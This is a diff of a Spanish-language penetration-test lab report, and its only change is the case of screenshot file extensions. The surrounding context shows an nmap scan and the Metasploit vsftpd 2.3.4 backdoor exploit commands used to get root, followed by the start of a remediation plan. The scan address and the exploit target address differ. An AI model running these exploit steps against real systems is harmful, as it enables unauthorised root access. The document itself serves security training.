@@ -8,7 +8,7 @@
 ## 2. Fase de Reconocimiento (Nmap)
 Ejecuté un escaneo agresivo para detectar versiones de servicios:
 
-![Captura de pantalla del escaneo de Nmap](nmap.png)
+![Captura de pantalla del escaneo de Nmap](nmap.PNG)
 
 `nmap -sV -p 21,22,80,445 10.0.2.3`
 
@@ -20,14 +20,14 @@ Ejecuté un escaneo agresivo para detectar versiones de servicios:
 Utilicé el framework Metasploit para verificar si la versión de vsftpd era vulnerable al backdoor conocido.
 * `use exploit/unix/ftp/vsftpd_234_backdoor`
 
-![Captura de pantalla del uso de msfconsole](msfconsole.png)
+![Captura de pantalla del uso de msfconsole](msfconsole.PNG)
 
 * `set RHOSTS 10.0.2.15`
 * `run`
 
 **Resultado:** Acceso exitoso a la terminal con privilegios de root.
 
-![Captura de pantalla de acceso](run_exploit.png)
+![Captura de pantalla de acceso](run_exploit.PNG)
 
 ## 4. Plan de Mitigación (Remediación)
 1. Actualizar el servicio FTP a la versión más reciente y segura.
